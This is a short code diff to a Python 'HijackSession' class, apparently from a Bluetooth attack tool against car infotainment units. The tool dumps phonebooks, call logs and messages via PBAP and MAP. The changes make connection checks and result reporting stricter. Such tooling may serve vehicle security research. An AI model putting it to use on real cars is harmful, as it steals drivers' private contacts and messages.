@@ -180,8 +180,8 @@ class HijackSession:
                 success(f"Connected to IVI {self.ivi_address}")
                 return True
             else:
-                warning("Connection status uncertain. Some profiles may still work.")
-                return True  # Try anyway
+                warning("Connection not verified. Profiles may not be accessible.")
+                return False
 
     def dump_phonebook(self, output_dir: str | None = None) -> dict:
         """Phase 4a: Download phonebook and call logs via PBAP."""
@@ -285,7 +285,10 @@ class HijackSession:
         # Phase 4a: PBAP
         try:
             pbap_data = self.dump_phonebook()
-            results["phases"]["pbap"] = {"status": "success", "data": pbap_data}
+            if pbap_data:
+                results["phases"]["pbap"] = {"status": "success", "data": pbap_data}
+            else:
+                results["phases"]["pbap"] = {"status": "failed", "error": "No data returned"}
         except Exception as e:
             warning(f"PBAP failed: {e}")
             results["phases"]["pbap"] = {"status": "failed", "error": str(e)}
@@ -293,7 +296,10 @@ class HijackSession:
         # Phase 4b: MAP
         try:
             map_data = self.dump_messages()
-            results["phases"]["map"] = {"status": "success", "data": map_data}
+            if map_data:
+                results["phases"]["map"] = {"status": "success", "data": map_data}
+            else:
+                results["phases"]["map"] = {"status": "failed", "error": "No data returned"}
         except Exception as e:
             warning(f"MAP failed: {e}")
             results["phases"]["map"] = {"status": "failed", "error": str(e)}
